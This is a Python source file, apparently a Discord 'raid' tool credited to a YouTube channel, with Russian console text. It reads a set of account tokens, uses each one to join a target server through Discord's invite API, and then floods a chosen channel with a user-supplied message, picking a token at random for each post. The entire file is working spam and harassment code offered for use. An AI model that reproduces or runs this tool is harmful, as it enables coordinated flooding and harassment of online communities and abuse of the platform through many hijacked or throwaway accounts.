import colorama
from colorama import Fore
colorama.init()

import time
import requests
import random

import dInputter

console_write = "[db]"

def start_logo():
	time.sleep(1)
	print(Fore.CYAN)

	print(console_write + "Запущенно")
	print(console_write + "Создал Hack Something")
	print(console_write + "YouTube.com " + "https://www.youtube.com/channel/UCJpnYttDUAUVR-WDtGvWurQ/")
	print(console_write + "v0.1")

def setup():
	print(Fore.GREEN)

	invite_id = input(console_write + "Ссылка-приглашение на сервер: ")
	target_message = input(console_write + "Сообщение для флуда: ")

	channel_id = input(console_write + "ID канала: ")
	times = int(input(console_write + "Количество итераций: "))

	connect_server(invite_id)
	start_atack(channel_ID = channel_id, iterations = times, message = target_message)

def connect_server(invite_id):
	print(Fore.BLUE)

	modifided_invite = invite_id.replace("https://discord.gg/", "")

	bot_tokens = dInputter.get_tokens()
	bots_amount = len(bot_tokens)

	session = requests.session()

	for i in range(bots_amount):
		session.post(f"https://discord.com/api/v9/invites/{modifided_invite}", headers = {'authorization' : bot_tokens[i]})
		print(console_write + bot_tokens[i] + " подключился!")

	session.close()

def start_atack(channel_ID : str, iterations : int, message : str):
	print(Fore.RED)

	session = requests.session()
	bot_tokens = dInputter.get_tokens()

	for i in range(iterations):
		responce = session.post(f"https://discord.com/api/v9/channels/{channel_ID}/messages", headers = {'authorization' : random.choice(bot_tokens)}, data = {'content' : message})
		print(f"{console_write}Отправлен запрос с кодом {responce.status_code}")

	print(console_write + "Работа завершенна! Нажмите на ENTER для выхода")
	print(Fore.RESET)
	input()


if __name__ == '__main__':
	start_logo()
	setup()